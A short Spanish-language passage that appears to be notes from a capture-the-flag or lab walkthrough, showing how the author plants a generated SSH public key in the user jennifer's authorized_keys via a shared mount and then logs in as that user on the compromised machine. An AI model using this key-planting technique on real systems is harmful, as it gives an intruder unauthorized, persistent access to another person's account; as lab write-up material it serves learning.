# Mirando el home de la máquina comprometida se observa que solo existe el usuario jennifer.
# Se deduce que el punto de montaje de vol1 es un directorio compartido de su home, por lo cual se genera un par de claves ssh y se introduce la publica dentro del authorized_keys
ssh-keygen -f jennifer 
cat jennifer.pub > authorized_keys

# Se copia la clave privada a la máquina víctima y se accede por ssh a localhost con el usuario jennifer
ssh jennifer@localhost -i /dev/shm/id_rsa_jennifer (funcionaría desde la máquina de atacante ya que es el mismo objetivo)
